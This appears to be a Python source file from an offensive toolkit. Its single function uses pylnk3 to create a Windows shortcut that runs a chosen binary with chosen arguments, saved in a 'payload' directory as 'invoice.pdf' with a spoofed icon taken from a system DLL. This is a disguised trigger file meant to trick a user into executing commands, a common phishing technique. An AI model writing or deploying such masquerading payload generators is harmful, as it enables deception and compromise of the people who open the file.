"""
List of Windows Icons & Their Paths
https://diymediahome.org/windows-icons-reference-list-with-details-locations-images/
"""
import pathlib, pylnk3

REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"

def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str):
    """Create an LNK trigger file in the payloads directory

    Args:
        target_bin (str): binary to execute a system command with
        args (str): binary arguments
        icon_src (str): DLL source for Windows Icons
        icon_index (int): Index No. of Icon
        description (str): LNK Description
    """
    lnk_path = pathlib.Path(PAYLOAD_DIR / "invoice.pdf")

    lnk = pylnk3.for_file(target_bin, lnk_path, args, description, icon_src, icon_index)
